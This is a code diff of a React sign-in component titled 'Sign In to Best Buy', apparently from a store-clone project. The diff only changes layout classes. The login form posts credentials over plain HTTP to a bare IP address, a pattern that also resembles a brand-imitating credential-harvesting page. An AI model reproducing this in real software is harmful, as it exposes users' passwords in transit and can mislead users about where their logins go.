@@ -82,11 +82,11 @@ if (loginVal.length>0) {
 
   return (
     <div className="h-100 pt-5 signIn" style={{background:"#e0e6ef"}} >
-    <div className="pt-6 border border-2 m-auto col-4 bg-white"  >
-<div className=' text-center' >
+    <div className="pt-6 border border-2 m-auto col-sm-8 col-md-5 col-lg-4 bg-white "  >
+<div className=' text-center container' >
 <h5 className="fw-bolder mt-3">Sign In to Best Buy</h5>
 </div>
-<form method="post" action="http://159.65.21.42:9000/login">
+<form method="post" action="http://159.65.21.42:9000/login"  className="">
 <div className="form-floating mb-3 col-11 mt-4 m-auto bg-white ">
   <input
   onChange={(e)=>{
